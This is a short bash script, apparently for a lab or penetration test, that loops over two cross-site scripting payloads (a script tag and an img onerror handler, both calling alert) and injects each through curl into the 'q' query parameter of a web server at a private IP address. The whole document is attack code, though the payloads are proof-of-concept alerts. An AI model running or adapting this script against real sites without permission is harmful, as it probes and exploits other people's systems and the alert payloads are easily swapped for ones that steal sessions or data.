#!/bin/bash

TARGET="http://10.30.141.95/"

echo "[*] Running XSS Attack..."

payloads=(
"<script>alert(1)</script>"
"<img src=x onerror=alert(1)>"
)

for p in "${payloads[@]}"
do
    echo "[+] Injecting: $p"
    curl "$TARGET?q=$p"
    sleep 1
done